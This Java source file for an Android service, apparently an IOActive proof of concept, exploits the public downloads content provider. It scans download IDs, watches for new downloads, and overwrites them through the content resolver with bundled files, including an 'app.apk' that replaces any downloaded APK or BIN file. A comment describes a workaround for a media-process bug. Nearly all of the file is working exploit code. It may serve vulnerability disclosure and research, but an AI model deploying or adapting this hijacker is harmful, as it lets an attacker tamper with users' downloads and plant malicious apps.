package com.ioactive.downloadHijacker;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;

import static com.ioactive.downloadHijacker.MainActivity.PUBLIC_DOWNLOADS_ID_URI;
import static com.ioactive.downloadHijacker.MainActivity.TAG;

public class DownloadHijackerService extends IntentService {

    // The service will stop automatically after "SERVICE_LIFETIME_MS" milliseconds
    private static final int SERVICE_LIFETIME_MS = 5 * 60 * 1000;

    // How many IDs to iterate starting from the last ID found
    private static final int MONITOR_RANGE = 50;

    private static final int FILE_PDF = 0;
    private static final int FILE_PNG = 1;
    private static final int FILE_JPG = 2;
    private static final int FILE_GIF = 3;
    private static final int FILE_APK = 4;

    // Array containing input streams to overwrite the downloaded files with different formats
    private static InputStream[] mOverwriteStreams = new InputStream[5];

    // Dummy container for file descriptors, to keep a reference and avoid closing them
    ArrayList<ParcelFileDescriptor> mFileDescriptors = new ArrayList<ParcelFileDescriptor>();

    public DownloadHijackerService() {
        super("DownloadHijackerService");
    }

    private void initializeInternalAssets() {
        AssetManager assetManager = getAssets();
        try {
            mOverwriteStreams[FILE_PDF] = assetManager.open("troll.pdf");
            mOverwriteStreams[FILE_PNG] = assetManager.open("troll.png");
            mOverwriteStreams[FILE_JPG] = assetManager.open("troll.jpg");
            mOverwriteStreams[FILE_GIF] = assetManager.open("troll.gif");
            mOverwriteStreams[FILE_APK] = assetManager.open("app.apk");
        } catch (IOException ex) {
            Log.e(TAG, "DownloadHijackerService: Error reading internal assets", ex);
        }
    }

    private static InputStream getOverwriteStreamByFileExtension(String filename) {
        if (filename != null && !filename.isEmpty()) {
            filename = filename.toLowerCase();
            if (filename.endsWith(".pdf"))
                return mOverwriteStreams[FILE_PDF];
            else if (filename.endsWith(".png"))
                return mOverwriteStreams[FILE_PNG];
            if (filename.endsWith(".jpg") || filename.endsWith(".jpeg"))
                return mOverwriteStreams[FILE_JPG];
            if (filename.endsWith(".gif"))
                return mOverwriteStreams[FILE_GIF];
            if (filename.endsWith(".apk") || filename.endsWith(".bin"))
                return mOverwriteStreams[FILE_APK];
        }
        return null;
    }

    @Override
    protected void onHandleIntent(Intent workIntent) {
        Log.d(TAG, "Starting download hijacker service...");
        //android.os.Process.setThreadPriority(-20);
        initializeInternalAssets();

        int minId = workIntent.getIntExtra("minId", 0);
        int maxId = workIntent.getIntExtra("maxId", 1000);
        boolean closeFiles = workIntent.getBooleanExtra("closeFiles", false);
        int lastId = 0;

        // Try to find the last used identifier to optimize the monitored range
        // and avoid overwriting preexisting files
        ContentResolver res = this.getContentResolver();
        for (int id = minId; id < maxId; id++) {
            Uri uri = Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);
            Cursor cur = res.query(uri, null, null, null, null);
            try {
                if (cur != null && cur.getCount() > 0) {
                    lastId = Math.max(id, lastId);
                }
            } finally {
                if (cur != null)
                    cur.close();
            }
        }

        Log.d(TAG, "Service ready! Last download ID = " + lastId);
        long tStart = System.currentTimeMillis();

        while (System.currentTimeMillis() < tStart + SERVICE_LIFETIME_MS) {
            for (int id = lastId + 1; id < lastId + MONITOR_RANGE; id++) {
                Uri uri = Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);
                Cursor cur = res.query(uri, null, null, null, null);

                try {
                    if (cur != null && cur.getCount() > 0) {
                        cur.moveToFirst();
                        String rowData = cur.getString(cur.getColumnIndex("_data"));
                        String rowUri = cur.getString(cur.getColumnIndex("uri"));
                        Log.d(TAG, id + "   " + rowData + "   " + rowUri);

                        InputStream is = getOverwriteStreamByFileExtension(rowData);
                        if (is != null) {
                            try {
                                ParcelFileDescriptor f = res.openFileDescriptor(uri, "rwt");
                                FileOutputStream fos = new FileOutputStream(f.getFileDescriptor());
                                is.reset();

                                byte[] buffer = new byte[1024];
                                int length;
                                while ((length = is.read(buffer)) > 0) {
                                    fos.write(buffer, 0, length);
                                }

                                fos.flush();

                                // Keeping a reference to the file descriptor to avoid closing it.
                                // If the file descriptor is closed, a bug in the media process will
                                // raise an exception attempting to update the download database with
                                // the new file size and modification timestamp.
                                if (closeFiles)
                                    f.close();
                                else
                                    mFileDescriptors.add(f);

                                Log.d(TAG, "File overwritten: " + rowData );
                                lastId = Math.max(id, lastId);
                            } catch (Exception e) {
                                Log.e(TAG, "Error overwriting file: ", e);
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "onHandleIntent: ", e);
                } finally {
                    if (cur != null)
                        cur.close();
                }
            }
        }

        Log.d(TAG, "Download hijacker service stopped.");
        stopSelf();
    }
}